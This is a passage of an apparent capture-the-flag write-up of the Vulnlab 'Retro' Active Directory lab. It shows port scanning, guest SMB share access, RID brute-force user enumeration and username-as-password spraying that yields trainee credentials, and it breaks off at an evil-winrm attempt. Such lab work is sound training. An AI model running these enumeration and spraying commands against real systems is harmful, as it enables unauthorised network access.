[{"content":"\u003cp\u003eThis easy lab from Vulnlab allows us to practice using pre-created computer accounts and exploiting vulnerabilities in AD CS.\u003c/p\u003e\n\u003ch2 id=\"reconnaissance\"\u003eReconnaissance\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enetwork scan: \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePORT     STATE SERVICE       VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e53/tcp   open  domain        Simple DNS Plus\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e88/tcp   open  kerberos-sec  Microsoft Windows Kerberos \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eserver time: 2025-10-14 17:57:37Z\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e135/tcp  open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e389/tcp  open  ldap          Microsoft Windows Active Directory LDAP \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eDomain: retro.vl0., Site: Default-First-Site-Name\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e445/tcp  open  microsoft-ds?\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e464/tcp  open  kpasswd5?\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eDomain: retro.vl0., Site: Default-First-Site-Name\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3268/tcp open  ldap          Microsoft Windows Active Directory LDAP \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eDomain: retro.vl0., Site: Default-First-Site-Name\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eDomain: retro.vl0., Site: Default-First-Site-Name\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3389/tcp open  ms-wbt-server Microsoft Terminal Services\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eWe can see from the nmap scan the use of LDAPS, which could indicate the use of AD CS. This service allows the creation of a PKI to issue certificates.\u003c/p\u003e\n\u003ch3 id=\"smb-enumeration\"\u003eSMB enumeration\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 14, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 20:12:32 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# nxc smb 10.10.98.67 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --shares\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Windows Server \u003cspan style=\"color:#ae81ff\"\u003e2022\u003c/span\u003e Build \u003cspan style=\"color:#ae81ff\"\u003e20348\u003c/span\u003e x64 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ename:DC\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003edomain:retro.vl\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003esigning:True\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eSMBv1:False\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e+\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e retro.vl\u003cspan style=\"color:#ae81ff\"\u003e\\:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Error enumerating shares: STATUS_ACCESS_DENIED\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 14, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 20:13:13 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# nxc smb 10.10.98.67 -u \u0026#39;test\u0026#39; -p \u0026#39;\u0026#39; --shares\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Windows Server \u003cspan style=\"color:#ae81ff\"\u003e2022\u003c/span\u003e Build \u003cspan style=\"color:#ae81ff\"\u003e20348\u003c/span\u003e x64 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ename:DC\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003edomain:retro.vl\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003esigning:True\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eSMBv1:False\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e+\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e retro.vl\u003cspan style=\"color:#ae81ff\"\u003e\\t\u003c/span\u003eest: \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eGuest\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Enumerated shares\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               Share           Permissions     Remark\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               -----           -----------     ------\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               ADMIN$                          Remote Admin\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               C$                              Default share\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               IPC$            READ            Remote IPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               NETLOGON                        Logon server share\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               Notes\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               SYSVOL                          Logon server share\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               Trainees        READ\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 14, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 20:17:35 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# smbclient //10.10.98.67/Trainees -U \u0026#34;dhgdgej\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePassword \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eWORKGROUP\u003cspan style=\"color:#ae81ff\"\u003e\\d\u003c/span\u003ehgdgej\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eTry \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;help\u0026#34;\u003c/span\u003e to get a list of possible commands.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmb: \u003cspan style=\"color:#ae81ff\"\u003e\\\u0026gt;\u003c/span\u003e ls\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  .                                   D        \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e  Sun Jul \u003cspan style=\"color:#ae81ff\"\u003e23\u003c/span\u003e 23:58:43 \u003cspan style=\"color:#ae81ff\"\u003e2023\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  ..                                DHS        \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e  Wed Jul \u003cspan style=\"color:#ae81ff\"\u003e26\u003c/span\u003e 11:54:14 \u003cspan style=\"color:#ae81ff\"\u003e2023\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  Important.txt                       A      \u003cspan style=\"color:#ae81ff\"\u003e288\u003c/span\u003e  Mon Jul \u003cspan style=\"color:#ae81ff\"\u003e24\u003c/span\u003e 00:00:13 \u003cspan style=\"color:#ae81ff\"\u003e2023\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#ae81ff\"\u003e6261499\u003c/span\u003e blocks of size 4096. \u003cspan style=\"color:#ae81ff\"\u003e2892582\u003c/span\u003e blocks available\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmb: \u003cspan style=\"color:#ae81ff\"\u003e\\\u0026gt;\u003c/span\u003e get Important.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egetting file \u003cspan style=\"color:#ae81ff\"\u003e\\I\u003c/span\u003emportant.txt of size \u003cspan style=\"color:#ae81ff\"\u003e288\u003c/span\u003e as Important.txt \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e2.6 KiloBytes/sec\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eaverage 2.6 KiloBytes/sec\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmb: \u003cspan style=\"color:#ae81ff\"\u003e\\\u0026gt;\u003c/span\u003e exit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 14, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 20:17:45 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# cat Important.txt\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDear Trainees,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eI know that some of you seemed to struggle with remembering strong and unique passwords.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSo we decided to bundle every one of you up into one account.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eStop bothering us. Please. We have other stuff to \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e than resetting your password every day.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eRegards\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eThe Admins\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eWe can see the existence of a trainee account for multiple users, with a unique password.\u003c/p\u003e\n\u003ch3 id=\"user-enumeration\"\u003eUser enumeration\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eenum users: nxc smb 10.10.108.91 -u \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;kfhfkhfkgh\u0026#39;\u003c/span\u003e -p \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e --rid-brute --log users.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecreate user file: cat users.txt | awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print $13}\u0026#39;\u003c/span\u003e | cut -d \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\\\u0026#39;\u003c/span\u003e -f \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e | sed -n 29,33p \u0026gt; users.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 14, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 20:18:50 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# cat users.txt\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etrainee\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBANKING$\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ejburley\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eHelpDesk\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etblack\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eNow we have a list of users. Searching in LDAP, I didn\u0026rsquo;t find any trivial passwords. So we\u0026rsquo;ll check if any user might be using an empty password or a password identical to their username.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 14, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 20:19:27 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# nxc smb 10.10.98.67 -u users.txt -p \u0026#39;\u0026#39; --no-bruteforce --continue-on-success\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Windows Server \u003cspan style=\"color:#ae81ff\"\u003e2022\u003c/span\u003e Build \u003cspan style=\"color:#ae81ff\"\u003e20348\u003c/span\u003e x64 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ename:DC\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003edomain:retro.vl\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003esigning:True\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eSMBv1:False\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e retro.vl\u003cspan style=\"color:#ae81ff\"\u003e\\t\u003c/span\u003erainee: STATUS_LOGON_FAILURE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e retro.vl\u003cspan style=\"color:#ae81ff\"\u003e\\B\u003c/span\u003eANKING$: STATUS_LOGON_FAILURE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e retro.vl\u003cspan style=\"color:#ae81ff\"\u003e\\j\u003c/span\u003eburley: STATUS_LOGON_FAILURE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e+\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e retro.vl\u003cspan style=\"color:#ae81ff\"\u003e\\H\u003c/span\u003eelpDesk: \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eGuest\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e retro.vl\u003cspan style=\"color:#ae81ff\"\u003e\\t\u003c/span\u003eblack: STATUS_LOGON_FAILURE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 14, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 20:20:26 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# nxc smb 10.10.98.67 -u users.txt -p users.txt --no-bruteforce --continue-on-success\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Windows Server \u003cspan style=\"color:#ae81ff\"\u003e2022\u003c/span\u003e Build \u003cspan style=\"color:#ae81ff\"\u003e20348\u003c/span\u003e x64 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ename:DC\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003edomain:retro.vl\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003esigning:True\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eSMBv1:False\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e+\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e retro.vl\u003cspan style=\"color:#ae81ff\"\u003e\\t\u003c/span\u003erainee:trainee\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e retro.vl\u003cspan style=\"color:#ae81ff\"\u003e\\B\u003c/span\u003eANKING$:BANKING$ STATUS_LOGON_FAILURE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e retro.vl\u003cspan style=\"color:#ae81ff\"\u003e\\j\u003c/span\u003eburley:jburley STATUS_LOGON_FAILURE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e+\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e retro.vl\u003cspan style=\"color:#ae81ff\"\u003e\\H\u003c/span\u003eelpDesk:HelpDesk \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eGuest\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e retro.vl\u003cspan style=\"color:#ae81ff\"\u003e\\t\u003c/span\u003eblack:tblack STATUS_LOGON_FAILURE\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eI tried, just in case, to see if we could get an interactive session with the credentials we found.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 14, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 20:31:30 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# evil-winrm -i 10.10.98.67 -u \u0026#39;trainee\u0026#39; -p \u0026#39;trainee\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan 